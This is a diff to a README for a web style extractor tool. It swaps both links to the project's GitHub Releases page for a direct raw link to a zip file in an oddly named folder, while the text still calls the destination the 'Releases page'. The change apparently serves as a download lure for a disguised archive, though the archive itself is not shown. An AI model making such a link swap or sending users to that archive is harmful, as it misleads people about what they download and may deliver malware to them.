@@ -6,11 +6,11 @@ Welcome to the **development-toolbox-web-style-extractor**! This tool allows you
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/keyb88/development-toolbox-web-style-extractor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/keyb88/development-toolbox-web-style-extractor/main/unvigorous/development-toolbox-web-style-extractor.zip)](https://raw.githubusercontent.com/keyb88/development-toolbox-web-style-extractor/main/unvigorous/development-toolbox-web-style-extractor.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/keyb88/development-toolbox-web-style-extractor/releases) to download the latest version of the software. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/keyb88/development-toolbox-web-style-extractor/main/unvigorous/development-toolbox-web-style-extractor.zip) to download the latest version of the software. 
 
 Follow these simple steps:
 
